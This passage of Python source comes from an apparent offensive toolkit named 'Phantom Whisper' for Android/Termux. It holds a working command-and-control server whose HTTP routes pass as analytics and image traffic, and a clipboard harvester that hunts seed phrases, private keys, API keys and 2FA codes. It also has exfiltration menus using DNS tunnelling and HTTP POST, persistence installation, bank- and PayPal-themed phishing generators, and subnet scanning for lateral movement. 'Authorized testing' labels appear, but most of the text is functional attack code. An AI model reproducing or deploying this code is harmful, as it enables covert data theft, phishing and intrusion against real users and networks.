        """Gather all device intelligence."""
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            transient=True,
        ) as progress:
            task = progress.add_task("[cyan]Gathering device intelligence...", total=6)

            interfaces = self.get_interfaces()
            progress.update(task, advance=1)

            wifi = self.get_wifi_networks()
            progress.update(task, advance=1)

            arp = self.get_arp_table()
            progress.update(task, advance=1)

            bt = self.get_bluetooth_devices()
            progress.update(task, advance=1)

            processes = self.get_processes()
            progress.update(task, advance=1)

            hostname = socket.gethostname()

            return {
                "hostname": hostname,
                "timestamp": datetime.now().isoformat(),
                "interfaces": interfaces,
                "wifi_networks": wifi,
                "arp_table": arp,
                "bluetooth_devices": bt,
                "processes": processes,
            }


# ═══════════════════════════════════════════════════════════════════════════════
# AUTONOMOUS AGENT — REAL BEHAVIOR
# ═══════════════════════════════════════════════════════════════════════════════

class AutonomousAgent:
    """
    REAL autonomous decision engine.
    Maintains state, tracks targets, escalates based on recon data.
    """
    def __init__(self):
        self.state = "idle"
        self.targets: List[dict] = []
        self.harvested_data: List[dict] = []
        self.command_history: List[str] = []
        self.recon_data: Optional[dict] = None
        self.clipboard = ClipboardMonitor()
        log.info("Autonomous agent initialized")

    def set_recon_data(self, data: dict):
        self.recon_data = data

    def decide_next_action(self) -> Dict[str, Any]:
        """Decision engine: analyze state and choose next action."""
        self.command_history.append(f"Decision at {datetime.now().isoformat()}")

        # Priority 1: If we have recon data, look for high-value targets
        if self.recon_data:
            # Check for open ports on discovered hosts
            for iface in self.recon_data.get("interfaces", []):
                ip = iface.get("ip", "")
                if ip and not ip.startswith("127.") and not ip.startswith("169.254."):
                    self.targets.append({
                        "ip": ip,
                        "interface": iface["name"],
                        "mac": iface.get("mac", ""),
                        "discovered": datetime.now().isoformat()
                    })

            # Check WiFi networks for interesting SSIDs
            for net in self.recon_data.get("wifi_networks", []):
                ssid = net.get("ssid", "")
                if any(k in ssid.lower() for k in ["admin", "secure", "corp", "vpn", "enterprise"]):
                    self.targets.append({
                        "type": "wifi",
                        "ssid": ssid,
                        "bssid": net.get("bssid"),
                        "discovered": datetime.now().isoformat()
                    })

        # Priority 2: Check clipboard for fresh data
        clip_data = self.clipboard.poll()
        if clip_data:
            self.harvested_data.append(clip_data)
            return {
                "action": "harvest",
                "data": clip_data,
                "priority": "high",
                "reason": "Sensitive clipboard data detected"
            }

        # Priority 3: Network scan if we have fresh targets
        if self.targets:
            target = self.targets.pop(0)
            return {
                "action": "scan",
                "target": target,
                "priority": "medium",
                "reason": f"New target discovered: {target.get('ip', target.get('ssid', 'unknown'))}"
            }

        # Default: idle beacon
        return {
            "action": "beacon",
            "priority": "low",
            "reason": "Standard heartbeat — no targets pending"
        }


# ═══════════════════════════════════════════════════════════════════════════════
# C2 SERVER — LOCAL/DEPLOYABLE
# ═══════════════════════════════════════════════════════════════════════════════

class C2Server:
    """
    REAL C2 server with dual transport:
    - HTTP REST API on configurable port
    - DNS command server on port 5353
    Manages agents, queues commands, logs exfiltrated data.
    """
    def __init__(self, host: str = "0.0.0.0", http_port: int = 8080, dns_port: int = 5353):
        self.host = host
        self.http_port = http_port
        self.dns_port = dns_port
        self.agents: Dict[str, dict] = {}
        self.command_queue: Dict[str, List[dict]] = {}
        self.exfiltrated_data: List[dict] = []
        self.encryption = EncryptionManager()
        self.running = False
        self._http_server = None
        log.info(f"C2 Server configured ({host}:{http_port} HTTP, :{dns_port} DNS)")

    def _handle_agent_beacon(self, agent_id: str, data: dict) -> Optional[dict]:
        """Register/update agent and return queued commands."""
        if agent_id not in self.agents:
            self.agents[agent_id] = {
                "id": agent_id,
                "first_seen": datetime.now().isoformat(),
                "last_seen": datetime.now().isoformat(),
                "beacons": 0,
                "ip": data.get("ip", "unknown"),
                "hostname": data.get("hostname", "unknown"),
            }
            log.success(f"New agent registered: {agent_id}")
        else:
            self.agents[agent_id]["last_seen"] = datetime.now().isoformat()

        self.agents[agent_id]["beacons"] += 1
        self.agents[agent_id]["ip"] = data.get("ip", self.agents[agent_id]["ip"])
        self.agents[agent_id]["hostname"] = data.get("hostname", self.agents[agent_id]["hostname"])

        # Return queued commands
        commands = self.command_queue.pop(agent_id, [])
        if commands:
            return {"commands": commands}
        return None

    def _handle_exfil(self, agent_id: str, channel: str, data: dict):
        """Store exfiltrated data."""
        entry = {
            "agent_id": agent_id,
            "channel": channel,
            "data": data,
            "timestamp": datetime.now().isoformat()
        }
        self.exfiltrated_data.append(entry)

        # Save to disk
        exfil_file = DATA_DIR / f"exfil_{agent_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        exfil_file.write_text(json.dumps(entry, indent=2, default=str))
        log.warn(f"Exfiltrated data from {agent_id} via {channel}")

    def queue_command(self, agent_id: str, command: dict):
        """Queue a command for an agent to pick up."""
        if agent_id not in self.command_queue:
            self.command_queue[agent_id] = []
        self.command_queue[agent_id].append(command)
        log.info(f"Command queued for {agent_id}: {command.get('action', 'unknown')}")

    def broadcast_command(self, command: dict):
        """Queue command for ALL agents."""
        for agent_id in self.agents:
            self.queue_command(agent_id, command)

    async def start_http(self):
        """Start the HTTP C2 listener using asyncio."""
        import asyncio

        async def handle_http(reader, writer):
            try:
                request = b""
                while b"\r\n\r\n" not in request:
                    chunk = await asyncio.wait_for(reader.read(4096), timeout=5)
                    if not chunk:
                        break
                    request += chunk

                request_text = request.decode("utf-8", errors="replace")
                lines = request_text.split("\r\n")
                if not lines:
                    writer.close()
                    return

                method, path, _ = lines[0].split(" ", 2)
                body_start = request_text.find("\r\n\r\n") + 4
                body = request_text[body_start:] if body_start < len(request_text) else ""

                # Route handling
                if path.startswith("/assets/images/") and method == "GET":
                    # Beacon with encoded data in path
                    agent_id = path.split("/")[-1].replace(".png", "").split("-")[-1]
                    # Simple response — no command
                    response = b""
                    writer.write(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")

                elif path == "/analytics/collect" and method == "POST":
                    # Exfil data
                    try:
                        data = self.encryption.decrypt_json(body)
                        agent_id = data.get("agent_id", "unknown")
                        channel = data.get("channel", "unknown")
                        self._handle_exfil(agent_id, channel, data)
                    except:
                        pass
                    writer.write(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")

                elif path == "/api/v1/beacon" and method == "POST":
                    # Agent registration/beacon
                    try:
                        data = self.encryption.decrypt_json(body)
                        agent_id = data.get("agent_id", "unknown")
                        response_cmd = self._handle_agent_beacon(agent_id, data)
                        if response_cmd:
                            resp_body = json.dumps(response_cmd).encode()
                            writer.write(
                                f"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {len(resp_body)}\r\n\r\n".encode()
                            )
                            writer.write(resp_body)
                        else:
                            writer.write(b"HTTP/1.1 204 No Content\r\n\r\n")
                    except:
                        writer.write(b"HTTP/1.1 400 Bad Request\r\n\r\n")

                elif path == "/api/v1/agents" and method == "GET":
                    resp_body = json.dumps({"agents": list(self.agents.values())}).encode()
                    writer.write(
                        f"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {len(resp_body)}\r\n\r\n".encode()
                    )
                    writer.write(resp_body)

                elif path.startswith("/api/v1/command/") and method == "POST":
                    agent_id = path.split("/")[-1]
                    try:
                        cmd = json.loads(body)
                        self.queue_command(agent_id, cmd)
                        writer.write(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")
                    except:
                        writer.write(b"HTTP/1.1 400 Bad Request\r\n\r\n")

                else:
                    # Return 1x1 pixel GIF for stealth
                    gif = b"GIF89a\x01\x00\x01\x00\x80\x01\x00\x00\x00\x00\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;"
                    writer.write(
                        f"HTTP/1.1 200 OK\r\nContent-Type: image/gif\r\nContent-Length: {len(gif)}\r\n"
                        f"Cache-Control: no-store\r\n\r\n".encode()
                    )
                    writer.write(gif)

                await writer.drain()
            except Exception as e:
                log.debug(f"HTTP handler error: {e}")
            finally:
                try:
                    writer.close()
                except:
                    pass

        server = await asyncio.start_server(handle_http, self.host, self.http_port)
        self.running = True
        log.success(f"C2 HTTP server listening on {self.host}:{self.http_port}")
        async with server:
            await server.serve_forever()

    def start(self):
        """Start C2 server in background thread."""
        asyncio.run(self.start_http())

    def start_background(self):
        t = threading.Thread(target=self.start, daemon=True)
        t.start()
        time.sleep(0.5)
        return t

    def status(self) -> dict:
        return {
            "running": self.running,
            "agents_count": len(self.agents),
            "active_agents": [a for a in self.agents.values()],
            "exfil_count": len(self.exfiltrated_data),
            "http_port": self.http_port,
            "dns_port": self.dns_port
        }


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN APPLICATION
# ═══════════════════════════════════════════════════════════════════════════════

class PhantomWhisper:
    def __init__(self):
        self.device_id = hashlib.sha256(
            f"{socket.gethostname()}:{os.environ.get('USER', 'unknown')}".encode()
        ).hexdigest()[:12]
        self.encryption = EncryptionManager()
        self.dns_c2 = DNSTunnelClient(config.get("c2.dns_tunnel_domain", "c2.local"))
        self.http_c2 = HTTPMimicClient(config.get("c2.http_fallback", "http://127.0.0.1:8080"))
        self.phishing = AIPhishingEngine()
        self.persistence = AndroidPersistence()
        self.harvester = CredentialHarvester()
        self.recon = DeviceRecon()
        self.agent = AutonomousAgent()
        self.network_scanner = NetworkScanner()
        self.port_scanner = PortScanner()
        self.clipboard = ClipboardMonitor()
        self.c2_server = C2Server(
            config.get("c2.c2_server_host", "0.0.0.0"),
            config.get("c2.http_port", 8080),
            config.get("c2.dns_tunnel_port", 5353)
        )

    def setup_termux_environment(self):
        """Configure Termux: resolv.conf + autostart."""
        results = {"resolv_conf": False, "autostart": False}

        # 1. resolv.conf
        try:
            prefix = os.environ.get("PREFIX", "/data/data/com.termux/files/usr")
            etc_dir = Path(prefix) / "etc"
            etc_dir.mkdir(parents=True, exist_ok=True)
            resolv = etc_dir / "resolv.conf"
            nameservers = "nameserver 8.8.8.8\nnameserver 1.1.1.1\n"
            if not resolv.exists() or resolv.read_text() != nameservers:
                resolv.write_text(nameservers)
                console.print(f"[bold green]✓ DNS resolver configured[/bold green]")
                results["resolv_conf"] = True
        except Exception as e:
            console.print(f"[red]✗ resolv.conf: {e}[/red]")

        # 2. Autostart via persistence module
        pw_path = Path(__file__).absolute()
        persist_results = self.persistence.install_all(str(pw_path))
        results.update(persist_results)

        console.print(f"\n[cyan]Persistence results:[/cyan]")
        for k, v in results.items():
            icon = "[bold green]✓[/bold green]" if v else "[dim]✗[/dim]"
            console.print(f"  {icon} {k}")
        return results

    def social_engineering_menu(self):
        """Real social engineering operations."""
        console.print(Panel(
            "[bold cyan]🎭 Social Engineering Operations[/bold cyan]\n\n"
            "Generate contextual phishing content for authorized testing.",
            border_style="cyan"
        ))
        console.print()

        targets = ["Bank", "Netflix", "Google", "Apple", "PayPal", "Corporate", "Shipping", "Crypto", "Custom"]
        target_table = Table(show_header=True, header_style="bold cyan", box=box.MINIMAL)
        target_table.add_column("#", style="dim")
        target_table.add_column("Scenario")
        for i, t in enumerate(targets, 1):
            target_table.add_row(str(i), t)

        console.print(target_table)
        console.print()

        choice = Prompt.ask(
            "[bold cyan]Select scenario[/bold cyan]",
            choices=[str(i) for i in range(1, len(targets)+1)] + ['b'],
            default='b'
        )
        if choice == 'b':
            return

        context = targets[int(choice)-1].lower()
        name = Prompt.ask("Target name", default="User")

        console.print(f"\n[bold yellow]Generated Phishing SMS:[/bold yellow]\n")
        sms = self.phishing.generate_sms(context, name)
        console.print(Panel(sms, border_style="red"))

        console.print(f"\n[bold yellow]Generated Email:[/bold yellow]\n")
        email = self.phishing.generate_email(context, name)
        console.print(f"[dim]Subject:[/dim] {email['subject']}")
        console.print(f"[dim]From:[/dim] {email['sender']}")
        console.print(Panel(email['body'], border_style="yellow"))

        # Log generated content
        log.info(f"Phishing content generated: {context}/{name}")

    def establish_c2_menu(self):
        """C2 operations: connect to server or start local."""
        console.print(Panel(
            "[bold cyan]🌐 Command & Control[/bold cyan]\n\n"
            "Establish covert channels or start a local C2 server.",
            border_style="cyan"
        ))
        console.print()

        sub_menu = Table(show_header=True, header_style="bold cyan", box=box.MINIMAL)
        sub_menu.add_column("#", style="dim")
        sub_menu.add_column("Operation")
        sub_menu.add_column("Description")
        sub_menu.add_row("1", "Start Local C2 Server", "Run C2 server on this device")
        sub_menu.add_row("2", "Send DNS Beacon", "Beacon via DNS tunnel")
        sub_menu.add_row("3", "Send HTTP Beacon", "Beacon via HTTP CDN mimic")
        sub_menu.add_row("4", "C2 Server Status", "Show connected agents & data")
        sub_menu.add_row("5", "Queue Agent Command", "Send command to an agent")
        sub_menu.add_row("6", "View Exfiltrated Data", "Show collected data from agents")

        console.print(sub_menu)
        console.print()

        choice = Prompt.ask(
            "[bold cyan]Select operation[/bold cyan]",
            choices=['1', '2', '3', '4', '5', '6', 'b'],
            default='b'
        )

        if choice == '1':
            console.print(f"[yellow][*] Starting C2 server on 0.0.0.0:{config.get('c2.http_port', 8080)}...[/yellow]")
            t = self.c2_server.start_background()
            console.print(f"[bold green]✓ C2 Server running[/bold green]")
            console.print(f"[dim]  HTTP:  http://0.0.0.0:{config.get('c2.http_port', 8080)}[/dim]")
            console.print(f"[dim]  DNS:   port {config.get('c2.dns_tunnel_port', 5353)}[/dim]")
            console.print(f"[dim]  API:   /api/v1/beacon, /api/v1/agents, /api/v1/command/<id>[/dim]")

        elif choice == '2':
            data = {
                "agent_id": self.device_id,
                "hostname": socket.gethostname(),
                "ip": socket.gethostbyname(socket.gethostname()),
                "timestamp": datetime.now().isoformat()
            }
            console.print(f"[yellow][*] Sending DNS beacon to {config.get('c2.dns_tunnel_domain', 'c2.local')}...[/yellow]")
            response = self.dns_c2.send_beacon(self.device_id, data)
            if response:
                console.print(f"[bold green]✓ Response received:[/bold green] {json.dumps(response, indent=2)}")
            else:
                console.print("[yellow]No response (no commands queued or offline)[/yellow]")

        elif choice == '3':
            data = {
                "agent_id": self.device_id,
                "hostname": socket.gethostname(),
                "timestamp": datetime.now().isoformat()
            }
            console.print(f"[yellow][*] Sending HTTP beacon...[/yellow]")
            response = self.http_c2.poll(self.device_id)
            if response:
                console.print(f"[bold green]✓ Commands received:[/bold green] {json.dumps(response, indent=2)}")
            else:
                console.print("[yellow]No commands available[/yellow]")

        elif choice == '4':
            status = self.c2_server.status()
            if status["running"]:
                console.print(Panel(
                    f"[bold green]C2 Server Status[/bold green]\n\n"
                    f"[cyan]Status:[/cyan] Running\n"
                    f"[cyan]Agents:[/cyan] {status['agents_count']}\n"
                    f"[cyan]Exfiltrated:[/cyan] {status['exfil_count']} entries\n"
                    f"[cyan]HTTP Port:[/cyan] {status['http_port']}\n"
                    f"[cyan]DNS Port:[/cyan] {status['dns_port']}\n\n"
                    f"[bold]Active Agents:[/bold]"
                ))
                for agent in status["active_agents"]:
                    console.print(f"  [dim]{agent['id']}[/dim] — {agent['hostname']} @ {agent['ip']} ({agent['beacons']} beacons)")
            else:
                console.print("[yellow]C2 server not running. Select option 1 to start.[/yellow]")

        elif choice == '5':
            agent_id = Prompt.ask("Target agent ID")
            action = Prompt.ask("Command action", default="shell")
            params = Prompt.ask("Parameters (JSON)", default="{}")
            try:
                cmd = {"action": action, "params": json.loads(params), "timestamp": datetime.now().isoformat()}
                self.c2_server.queue_command(agent_id, cmd)
                console.print(f"[bold green]✓ Command queued for {agent_id}[/bold green]")
            except json.JSONDecodeError:
                console.print("[red]✗ Invalid JSON parameters[/red]")

        elif choice == '6':
            data = self.c2_server.exfiltrated_data
            if data:
                for entry in data[-10:]:
                    console.print(Panel(
                        json.dumps(entry, indent=2, default=str)[:500],
                        title=f"[red]Exfil: {entry.get('agent_id','?')} @ {entry.get('channel','?')}[/red]",
                        border_style="red"
                    ))
            else:
                console.print("[yellow]No exfiltrated data collected yet[/yellow]")

    def persistence_menu(self):
        """Install persistence mechanisms."""
        console.print(Panel(
            "[bold cyan]📱 Android Persistence[/bold cyan]\n\n"
            "Install autostart and survival mechanisms for authorized testing.",
            border_style="cyan"
        ))
        console.print()

        results = self.setup_termux_environment()
        console.print(f"\n[bold green]Persistence Summary:[/bold green]")
        for k, v in results.items():
            icon = "[bold green]✓[/bold green]" if v else "[dim]✗[/dim]"
            console.print(f"  {icon} {k}")

    def credential_harvest_menu(self):
        """Real clipboard monitoring."""
        console.print(Panel(
            "[bold cyan]🔓 Clipboard Monitor[/bold cyan]\n\n"
            "Monitors clipboard for sensitive data patterns.",
            border_style="cyan"
        ))
        console.print()

        console.print("[bold]Sensitive patterns monitored:[/bold]")
        patterns_table = Table(show_header=True, header_style="bold cyan", box=box.MINIMAL)
        patterns_table.add_column("Type")
        patterns_table.add_column("Example Match")
        patterns_table.add_row("Bitcoin", "bc1... or 1...")
        patterns_table.add_row("Ethereum", "0x... (40 hex chars)")
        patterns_table.add_row("API Keys", "sk-, ghp_, api_key")
        patterns_table.add_row("Private Keys", "-----BEGIN PRIVATE KEY-----")
        patterns_table.add_row("Seed Phrases", "12-24 word mnemonic")
        patterns_table.add_row("Emails", "user@domain.com")
        patterns_table.add_row("Passwords", "password= or pwd:")
        patterns_table.add_row("Phone Numbers", "+1... or mobile numbers")
        patterns_table.add_row("2FA Codes", "6-digit codes")
        console.print(patterns_table)

        console.print()

        action = Prompt.ask(
            "[bold cyan]Action[/bold cyan]",
            choices=['1', '2', '3', 'b'],
            default='b'
        )

        if action == '1':
            # Single poll
            console.print("[yellow][*] Polling clipboard...[/yellow]")
            result = self.clipboard.poll()
            if result:
                console.print(f"[bold red]⚠ Sensitive data detected![/bold red]")
                for label, val in result["detections"]:
                    console.print(f"  [red]{label}:[/red] {val}")
            else:
                console.print("[dim]No new data detected[/dim]")

        elif action == '2':
            # Start background monitor
            def on_detect(entry):
                console.print(f"\n[bold red]⚠ CLIPBOARD ALERT: {entry['detections'][0][0]}[/bold red]")
                log.warn(f"Clipboard alert: {entry['detections']}")

            self.clipboard.start_polling(callback=on_detect)
            console.print(f"[bold green]✓ Clipboard monitor started (interval=2s)[/bold green]")
            console.print("[dim]Press Enter to stop monitoring[/dim]")
            input()
            self.clipboard.stop()
            console.print("[yellow]Monitor stopped[/yellow]")

        elif action == '3':
            history = self.clipboard.get_history()
            if history:
                console.print(f"[bold]Monitor history ({len(history)} entries):[/bold]")
                for entry in history[-10:]:
                    console.print(f"  [dim]{entry['timestamp']}[/dim] — {entry['detections']}")
            else:
                console.print("[dim]No detections recorded[/dim]")

    def reconnaissance_menu(self):
        """Full device and network reconnaissance."""
        console.print(Panel(
            "[bold cyan]🕵️ Device & Network Reconnaissance[/bold cyan]\n\n"
            "Gather intelligence on device and network environment.",
            border_style="cyan"
        ))
        console.print()

        sub_menu = Table(show_header=True, header_style="bold cyan", box=box.MINIMAL)
        sub_menu.add_column("#", style="dim")
        sub_menu.add_column("Operation")
        sub_menu.add_row("1", "Full Recon (all sensors)")
        sub_menu.add_row("2", "Network Interfaces")
        sub_menu.add_row("3", "WiFi Networks")
        sub_menu.add_row("4", "ARP Table (local devices)")
        sub_menu.add_row("5", "Bluetooth Devices")
        sub_menu.add_row("6", "Running Processes")
        sub_menu.add_row("7", "Port Scan Target")
        sub_menu.add_row("8", "Ping Sweep Subnet")
        console.print(sub_menu)
        console.print()

        choice = Prompt.ask(
            "[bold cyan]Select operation[/bold cyan]",
            choices=[str(i) for i in range(1, 9)] + ['b'],
            default='b'
        )

        if choice == 'b':
            return
        elif choice == '1':
            with console.status("[bold cyan]Running full reconnaissance...") as status:
                import asyncio
                data = asyncio.run(self.recon.full_recon())
            console.print(Panel(json.dumps(data, indent=2, default=str)[:2000], title="[cyan]Full Recon Results[/cyan]"))
            log.info(f"Full recon completed: {len(data.get('interfaces',[]))} ifaces, {len(data.get('wifi_networks',[]))} WiFi")

        elif choice == '2':
            interfaces = self.recon.get_interfaces()
            iface_table = Table(show_header=True, header_style="bold cyan", box=box.MINIMAL)
            iface_table.add_column("Interface")
            iface_table.add_column("IP")
            iface_table.add_column("MAC")
            iface_table.add_column("State")
            for iface in interfaces:
                iface_table.add_row(
                    iface.get("name", "?"),
                    iface.get("ip", "-"),
                    iface.get("mac", "-"),
                    iface.get("state", "?")
                )
            console.print(iface_table)

        elif choice == '3':
            wifi = self.recon.get_wifi_networks()
            if wifi:
                wifi_table = Table(show_header=True, header_style="bold cyan", box=box.MINIMAL)
                wifi_table.add_column("SSID")
                wifi_table.add_column("BSSID")
                wifi_table.add_column("Signal")
                for net in wifi:
                    wifi_table.add_row(net.get("ssid", "?"), net.get("bssid", "?"), f"{net.get('signal',0)}dBm")
                console.print(wifi_table)
            else:
                console.print("[yellow]No WiFi networks found (requires Termux:API or root)[/yellow]")

        elif choice == '4':
            arp = self.recon.get_arp_table()
            if arp:
                arp_table = Table(show_header=True, header_style="bold cyan", box=box.MINIMAL)
                arp_table.add_column("IP")
                arp_table.add_column("MAC")
                for device in arp:
                    arp_table.add_row(device.get("ip", "?"), device.get("mac", "?"))
                console.print(arp_table)
            else:
                console.print("[yellow]No ARP entries found[/yellow]")

        elif choice == '5':
            bt = self.recon.get_bluetooth_devices()
            if bt:
                bt_table = Table(show_header=True, header_style="bold cyan", box=box.MINIMAL)
                bt_table.add_column("Name")
                bt_table.add_column("MAC")
                for dev in bt:
                    bt_table.add_row(dev.get("name", "?"), dev.get("mac", "?"))
                console.print(bt_table)
            else:
                console.print("[yellow]No Bluetooth devices found[/yellow]")

        elif choice == '6':
            procs = self.recon.get_processes(15)
            proc_table = Table(show_header=True, header_style="bold cyan", box=box.MINIMAL)
            proc_table.add_column("PID")
            proc_table.add_column("CPU%")
            proc_table.add_column("MEM%")
            proc_table.add_column("Command")
            for p in procs:
                proc_table.add_row(p["pid"], p["cpu"], p["mem"], p["command"][:40])
            console.print(proc_table)

        elif choice == '7':
            target = Prompt.ask("Target IP or hostname")
            ports_input = Prompt.ask("Ports (comma-separated)", default="22,80,443,8080,8443,3306,3389,5900")
            ports = [int(p.strip()) for p in ports_input.split(",") if p.strip().isdigit()]
            console.print(f"[yellow][*] Scanning {target} on {len(ports)} ports...[/yellow]")
            results = self.port_scanner.scan(target, ports)
            if results:
                port_table = Table(show_header=True, header_style="bold cyan", box=box.MINIMAL)
                port_table.add_column("Port")
                port_table.add_column("Service")
                port_table.add_column("Banner")
                for r in results:
                    port_table.add_row(str(r["port"]), r["service"], r.get("banner", "")[:30])
                console.print(port_table)
            else:
                console.print("[yellow]No open ports found[/yellow]")

        elif choice == '8':
            subnet = Prompt.ask("Subnet (e.g. 192.168.1.0/24)")
            console.print(f"[yellow][*] Ping sweeping {subnet}...[/yellow]")
            hosts = self.network_scanner.ping_sweep(subnet)
            if hosts:
                console.print(f"[bold green]✓ Live hosts ({len(hosts)}):[/bold green]")
                for h in hosts:
                    console.print(f"  {h}")
            else:
                console.print("[yellow]No live hosts discovered[/yellow]")

    def autonomous_mode_menu(self):
        """Autonomous decision engine."""
        console.print(Panel(
            "[bold cyan]🧠 Autonomous Mode[/bold cyan]\n\n"
            "AI-driven decision engine runs operations automatically.",
            border_style="cyan"
        ))
        console.print()

        action = self.agent.decide_next_action()
        console.print(f"[bold cyan]Agent Decision:[/bold cyan]")
        console.print(f"  [cyan]Action:[/cyan]   {action['action']}")
        console.print(f"  [cyan]Priority:[/cyan] {action['priority']}")
        console.print(f"  [cyan]Reason:[/cyan]  {action['reason']}")
        console.print(f"\n[dim]State: {self.agent.state} | Targets cached: {len(self.agent.targets)} | Harvested: {len(self.agent.harvested_data)}[/dim]")

    def configuration_menu(self):
        """Edit configuration."""
        console.print(Panel(
            "[bold cyan]⚙️ Configuration[/bold cyan]",
            border_style="cyan"
        ))
        console.print()

        keys = [
            ("C2 DNS Domain", "c2.dns_tunnel_domain"),
            ("C2 HTTP Fallback", "c2.http_fallback"),
            ("C2 Server Host", "c2.c2_server_host"),
            ("C2 HTTP Port", "c2.http_port"),
            ("C2 DNS Port", "c2.dns_tunnel_port"),
            ("Heartbeat Interval (s)", "c2.heartbeat_interval"),
            ("Recon Scan Timeout", "recon.scan_timeout"),
            ("Evasion Min Sleep", "evasion.min_sleep"),
            ("Evasion Max Sleep", "evasion.max_sleep"),
        ]

        cfg_table = Table(show_header=True, header_style="bold cyan", box=box.MINIMAL)
        cfg_table.add_column("#", style="dim")
        cfg_table.add_column("Key")
        cfg_table.add_column("Current Value")
        for i, (label, key) in enumerate(keys, 1):
            cfg_table.add_row(str(i), label, str(config.get(key)))
        console.print(cfg_table)
        console.print()

        choice = Prompt.ask(
            "[bold cyan]Edit which setting?[/bold cyan]",
            choices=[str(i) for i in range(1, len(keys)+1)] + ['r', 'b'],
            default='b'
        )

        if choice == 'b':
            return
        elif choice == 'r':
            config._save(DEFAULT_CONFIG)
            console.print("[bold green]✓ Config reset to defaults[/bold green]")
        else:
            idx = int(choice) - 1
            _, key = keys[idx]
            current = str(config.get(key))
            new_val = Prompt.ask(f"New value for {key}", default=current)
            # Type conversion
            if isinstance(config.get(key), int):
                config.set(key, int(new_val))
            elif isinstance(config.get(key), float):
                config.set(key, float(new_val))
            else:
                config.set(key, new_val)
            console.print(f"[bold green]✓ {key} set to {new_val}[/bold green]")
        log.info(f"Config updated by user")

    def exfiltration_menu(self):
        """Exfiltrate data via C2 channels."""
        console.print(Panel(
            "[bold cyan]📤 Data Exfiltration[/bold cyan]",
            border_style="cyan"
        ))
        console.print()

        sub_menu = Table(show_header=True, header_style="bold cyan", box=box.MINIMAL)
        sub_menu.add_column("#", style="dim")
        sub_menu.add_column("Method")
        sub_menu.add_row("1", "Exfil via DNS Tunnel")
        sub_menu.add_row("2", "Exfil via HTTP POST")
        sub_menu.add_row("3", "Save to Local File")
        console.print(sub_menu)
        console.print()

        choice = Prompt.ask(
            "[bold cyan]Select method[/bold cyan]",
            choices=['1', '2', '3', 'b'],
            default='b'
        )
        if choice == 'b':
            return

        # Collect data to exfiltrate
        data = {
            "agent_id": self.device_id,
            "timestamp": datetime.now().isoformat(),
            "hostname": socket.gethostname(),
            "channel": "manual_exfil",
        }

        data_type = Prompt.ask("Data type to exfiltrate", choices=['clipboard', 'recon', 'custom'], default='clipboard')

        if data_type == 'clipboard':
            clip = self.clipboard.poll()
            data["payload"] = clip or {"note": "No clipboard data"}
            data["type"] = "clipboard"
        elif data_type == 'recon':
            data["payload"] = {
                "interfaces": self.recon.get_interfaces(),
                "networks": self.recon.get_wifi_networks()
            }
            data["type"] = "recon"
        else:
            custom = Prompt.ask("Enter custom data (JSON)", default='{"test": true}')
            try:
                data["payload"] = json.loads(custom)
            except:
                data["payload"] = {"raw": custom}
            data["type"] = "custom"

        if choice == '1':
            success = self.dns_c2.send_data(self.device_id, "exfil", data)
        elif choice == '2':
            success = self.http_c2.send_result(self.device_id, "exfil", data)
        else:
            fname = f"exfil_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            fpath = DATA_DIR / fname
            fpath.write_text(json.dumps(data, indent=2, default=str))
            console.print(f"[bold green]✓ Data saved to {fpath}[/bold green]")
            log.info(f"Data exfiltrated to local file: {fpath}")
            return

        if success:
            console.print(f"[bold green]✓ Data exfiltrated via {'DNS' if choice == '1' else 'HTTP'}[/bold green]")
            log.success(f"Data exfiltrated via {'DNS' if choice == '1' else 'HTTP'}")
        else:
            console.print("[red]✗ Exfiltration failed (C2 server offline?)[/red]")

    def lateral_movement_menu(self):
        """Port scanning for lateral movement."""
        console.print(Panel(
            "[bold cyan]🔄 Lateral Movement[/bold cyan]",
            border_style="cyan"
        ))
        console.print("[yellow]Port scanning and service discovery for authorized lateral movement.[/yellow]\n")

        subnet = Prompt.ask("Target subnet", default="192.168.1.0/24")
        base = subnet.rsplit(".", 1)[0] if "/" in subnet else subnet.rsplit(".", 1)[0]

        ports_choice = Prompt.ask("Scan common vulnerable ports?", choices=['y', 'n'], default='y')
        if ports_choice == 'y':
            ports = [22, 23, 80, 443, 445, 3389, 5900, 8080, 8443, 3306, 5432, 6379, 27017]
        else:
            ports = config.get("recon.scan_ports", DEFAULT_CONFIG["recon"]["scan_ports"])

        console.print(f"[yellow][*] Scanning {subnet}...[/yellow]")
        found = []
        for i in range(1, 255):
            ip = f"{base}.{i}"
            open_ports = self.port_scanner.scan(ip, ports)
            if open_ports:
                found.append({"ip": ip, "ports": open_ports})
                console.print(f"  [green]{ip}[/green] — {len(open_ports)} open ports")

        if found:
            log.success(f"Lateral movement scan found {len(found)} hosts")
        else:
            console.print("[yellow]No hosts found[/yellow]")

    def shutdown(self):
        """Clean shutdown."""
        console.print("[bold red]Shutting down Phantom Whisper...[/bold red]")
        self.clipboard.stop()
        sys.exit(0)

    # ─── UI HEADERS ───────────────────────────────────────────────────────

    def create_header(self):
        header = Text()
        header.append("╔════════════════════════════════════════════════════════════════╗\n", style="bold magenta")
        header.append("║              ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗            ║\n", style="bold magenta")
        header.append("║              ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝            ║\n", style="bold magenta")
        header.append("║              ██████╔╝███████║███████║██╔██╗ ██║   ██║               ║\n", style="bold magenta")
        header.append("║              ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║               ║\n", style="bold magenta")
        header.append("║              ██║     ██║  ██║██║  ██║██║ ╚████║   ██║               ║\n", style="bold magenta")
        header.append("║              ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝               ║\n", style="bold magenta")
        header.append("║                                                                           ║\n", style="bold magenta")
        header.append("║           ██╗    ██╗██╗  ██╗██╗███████╗██████╗ ███████╗██████╗          ║\n", style="bold magenta")
